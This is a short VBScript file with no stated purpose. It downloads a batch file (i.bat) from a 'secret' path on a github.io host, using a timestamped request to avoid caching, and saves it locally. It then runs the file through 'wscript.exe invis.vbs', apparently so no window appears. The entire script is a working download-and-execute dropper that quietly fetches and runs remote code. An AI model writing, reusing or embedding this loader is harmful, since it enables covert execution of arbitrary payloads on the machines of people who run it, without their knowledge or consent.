
'------------------------------------COPY FILE------------------------------------

    strFileURL = "http://wumbogames.github.io/secret/i.bat"
    strHDLocation = "i.bat"

' Fetch the file
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")

    objXMLHTTP.open "GET", strFileURL & "?t=" & Now() & " " & Timer(), false
    objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
	Set objADOStream = CreateObject("ADODB.Stream")
	objADOStream.Open
	objADOStream.Type = 1 'adTypeBinary

	objADOStream.Write objXMLHTTP.ResponseBody
	objADOStream.Position = 0    'Set the stream position to the start

	Set objFSO = Createobject("Scripting.FileSystemObject")
	If objFSO.Fileexists(strHDLocation) Then 
		objFSO.DeleteFile strHDLocation
	End if

	Set objFSO = Nothing

	objADOStream.SaveToFile strHDLocation
	objADOStream.Close
	Set objADOStream = Nothing
End if

Set objXMLHTTP = Nothing


'------------------------------------RUN FILE------------------------------------
Dim oShell
Set oShell = Nothing
Set oShell = WScript.CreateObject("WScript.Shell")
oShell.run "wscript.exe invis.vbs i.bat %*" 

Set oShell = Nothing